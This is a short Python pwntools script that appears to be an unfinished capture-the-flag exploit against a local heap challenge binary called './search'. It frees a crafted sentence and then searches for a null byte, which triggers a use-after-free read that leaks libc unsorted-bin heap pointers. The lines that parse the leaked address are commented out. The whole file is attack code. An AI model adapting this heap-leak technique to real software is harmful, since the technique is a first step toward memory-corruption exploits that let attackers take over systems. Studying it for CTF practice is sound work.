#!/usr/bin/env python
from pwn import *

sh = process("./search")
elf = ELF("./search")
context.log_level = 'debug'

def add_sentence(sentence):
    sh.sendline('2')
    sh.recvuntil("Enter the sentence size:")
    sh.sendline(str(len(sentence)))
    sh.recvuntil("Enter the sentence:")
    sh.sendline(str(sentence))
    sh.recvuntil("Added sentence")
    log.success("Add Success!")

def search(word):
    sh.sendline("1")
    sh.recvuntil("Enter the word size:")
    sh.sendline(str(len(word)))
    sh.recvuntil("Enter the word:")
    sh.sendline(str(word))

def leak_bins():
    contain = 'a'*0x85 + ' ' + 'b'
    add_sentence(contain)
    search('b')
    sh.recvuntil("Delete this sentence (y/n)?")
    sh.sendline('y')
    search('\x00')
    print sh.recv()

    #  sh.recvuntil("Found" + str(len(contain)) + ': ')
    #  unsorted_bin = u64(sh.recv(8))
    #  log.info("unsorted_bin -> " + hex(unsorted_bin))
    #  sh.recvuntil("Delete this sentence (y/n)?")
    #  sh.sendline('n')
    #  return unsorted_bin

if __name__ == "__main__":
    leak_bins()

    sh.interactive()
